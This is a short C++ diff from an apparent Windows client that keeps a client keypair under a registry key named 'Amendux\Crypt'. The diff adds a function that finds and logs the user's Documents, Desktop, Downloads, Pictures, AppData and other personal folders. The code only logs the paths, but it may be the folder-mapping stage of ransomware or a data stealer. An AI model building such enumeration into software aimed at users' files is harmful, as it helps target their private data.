@@ -10,6 +10,8 @@ void Config::Init(Encrypt& encrypt)
 {
 	Log::Instance()->write(L"Config", L"Initialize config module");
 
+	Environment();
+
 	HKEY hRoot = RegDB::createKey(HKEY_CURRENT_USER, L"SOFTWARE\\Amendux\\Crypt");
 	LPBYTE dRsPubkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPubkey", crypto_box_PUBLICKEYBYTES);
 	LPBYTE dRsPrivkey = RegDB::getValue<LPBYTE>(hRoot, REG_BINARY, L"clientPrivkey", crypto_box_SECRETKEYBYTES);
@@ -34,6 +36,40 @@ void Config::Init(Encrypt& encrypt)
 	DWORD execMode = 3;
 	RegDB::setValue<DWORD *>(hRoot, REG_DWORD, L"ExecMode", &execMode, sizeof(DWORD));
 }
+
+
+void Config::Environment()
+{
+	PWCHAR sUserDir;
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_DOCUMENTS);
+	Log::Instance()->write(L"Config", L"[Env] User document: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_CONTACT);
+	Log::Instance()->write(L"Config", L"[Env] User contact: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_DESKTOP);
+	Log::Instance()->write(L"Config", L"[Env] User desktop: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_DOWNLOAD);
+	Log::Instance()->write(L"Config", L"[Env] User download: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_FAVORITE);
+	Log::Instance()->write(L"Config", L"[Env] User favorite: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_APPDATA);
+	Log::Instance()->write(L"Config", L"[Env] User appdata: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_PICTURES);
+	Log::Instance()->write(L"Config", L"[Env] User pictures: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_MUSIC);
+	Log::Instance()->write(L"Config", L"[Env] User music: " + std::wstring(sUserDir));
+
+	sUserDir = Util::getDirectory(Util::Directory::USER_VIDEOS);
+	Log::Instance()->write(L"Config", L"[Env] User videos: " + std::wstring(sUserDir));
+}
+
 
 void Config::Terminate()
 {
